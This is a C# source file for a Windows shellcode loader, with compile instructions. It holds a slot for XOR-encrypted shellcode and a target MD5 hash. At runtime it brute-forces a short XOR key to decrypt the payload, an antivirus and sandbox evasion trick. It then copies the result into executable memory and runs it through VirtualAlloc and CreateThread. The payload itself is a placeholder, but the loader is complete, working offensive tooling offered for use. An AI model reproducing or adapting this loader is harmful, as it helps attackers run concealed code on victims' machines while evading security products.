/*
Author: Arno0x0x, Twitter: @Arno0x0x

How to compile:
===============
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:bfDecryptShellcode.exe bfDecryptShellcode.cs

Or, with debug information:
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /define:DEBUG /out:bfDecryptShellcode.exe bfDecryptShellcode.cs

*/

using System;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace BFDecryptShellcode
{
	//============================================================================================
	// Dumb static class to hold all program main parameters
	//============================================================================================
    public static class PARAM
	{
		//----------------------------------------------------------------------------------------
		// Converts a hexdigest string representation of a byte array to an actual byte array
		// Typically, an MD5 hash hexdigest string
		//----------------------------------------------------------------------------------------
		private static byte[] StringToByteArray(string hex) {
			return Enumerable.Range(0, hex.Length)
							 .Where(x => x % 2 == 0)
							 .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
							 .ToArray();
		}
		
		// <<<< ----------------------------------- >>>>>
		// PUT YOUR ENCRYPTED SHELLCODE HERE
		// The multibyte XOR encrypted shellcode
		public static byte[] encryptedShellcode = new byte[] { XOR ENCRYPTED SHELLCODE HERE };
		// <<<< ----------------------------------- >>>>>
		
		// <<<< ----------------------------------- >>>>>
		// PUT THE TARGET MD5 HERE
		// The target (decrypted) shellcode MD5 hash. This is used to tell that the key was found
		public static byte[] shellcodeMD5 = StringToByteArray("target_md5_digest");
		// <<<< ----------------------------------- >>>>>

		
		// The charset to be used for brute forcing the XOR key
		//public static string charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
		//public static string charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
		public static string charset = "abcdefghijklmnopqrstuvwxyz";
		
		// The key size
		public static int keySize = 5;
	}
	
	//============================================================================================
	//
	//============================================================================================
    class Program
    {
		//----------------------------------------------------------------------------------------
		// Returns the MD5 hash of a byte array
		//----------------------------------------------------------------------------------------		
		private static byte[] GetMD5Hash(byte[] source)
        {
            return new MD5CryptoServiceProvider().ComputeHash(source);
        }
		
		//----------------------------------------------------------------------------------------
		// Returns the XOR encrpytion/decryption of a source byte array, given a key as a byte array
		//----------------------------------------------------------------------------------------
		private static byte[] xor(byte[] source, byte[] key)
		{
			byte[] decrypted = new byte[source.Length];
		
			for(int i = 0; i < source.Length; i++) {
				decrypted[i] = (byte) (source[i] ^ key[i % key.Length]);
			}
			
			return decrypted;
		}
		
		//----------------------------------------------------------------------------------------
		// BruteForces an encrypted shellcode
		//----------------------------------------------------------------------------------------
		private static byte[] BruteForceKey(byte[] encryptedShellcode)
		{	
			byte[] decryptedShellcode = null;
			
			int charsetSpace = PARAM.charset.Length;
			double searchSpace = Math.Pow(charsetSpace, PARAM.keySize);
			string key = String.Empty;
			byte[] computedMD5 = null;
#if (DEBUG)
			Console.WriteLine("Charset size: [{0}]\nSearch space:[{1}]",charsetSpace,searchSpace);
			Console.WriteLine("Press <ENTER> to start...");
			Console.ReadLine();
#endif
			//-----------------------------------------
			// Brute forcing key
			for (double i = 0; i < searchSpace; i++) {
#if (DEBUG)				
				Console.WriteLine("i:{0}",i);
#endif			
				key = String.Empty;

				int[] baseVector = new int[PARAM.keySize];
				double reminder = i;
				for (int j = PARAM.keySize-1; j >= 0; j--) {
					baseVector[j] = (int)Math.Floor(reminder/Math.Pow(charsetSpace,j));
					reminder = reminder - (baseVector[j]*Math.Pow(charsetSpace,j));
#if (DEBUG)
					Console.WriteLine("j:{0} --> {1}",j,baseVector[j]);
#endif
				}
				
				for (int j = 0; j < PARAM.keySize; j++) {
					key = String.Format("{0}{1}",PARAM.charset[baseVector[j]],key);
				}
#if (DEBUG)
				Console.WriteLine(key);
#endif
				decryptedShellcode = xor(encryptedShellcode, Encoding.ASCII.GetBytes(key));
				computedMD5 = GetMD5Hash(decryptedShellcode);
				if (computedMD5.SequenceEqual(PARAM.shellcodeMD5)) {
#if (DEBUG)
					Console.WriteLine("Key found after {0} iterations: [{1}]",i,key);
#endif
					return decryptedShellcode;
				}
			}
			return null;
		}
		
		//----------------------------------------------------------------------------------------
		// MAIN FUNCTION
		//----------------------------------------------------------------------------------------
        public static void Main()
        {
			byte[] decryptedShellcode = BruteForceKey(PARAM.encryptedShellcode);
			
			if (decryptedShellcode == null) return;
			
			//---------------------------------------------------------------------------------
			// Copy decrypted shellcode to memory and execute it
            UInt32 funcAddr = VirtualAlloc(0, (UInt32)decryptedShellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(decryptedShellcode, 0, (IntPtr)(funcAddr), decryptedShellcode.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;

            // prepare data
            IntPtr pinfo = IntPtr.Zero;

            // execute native code
            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return;
        }

        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
             UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(
          UInt32 lpThreadAttributes,
          UInt32 dwStackSize,
          UInt32 lpStartAddress,
          IntPtr param,
          UInt32 dwCreationFlags,
          ref UInt32 lpThreadId
          );

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(
          IntPtr hHandle,
          UInt32 dwMilliseconds
          );
    }
}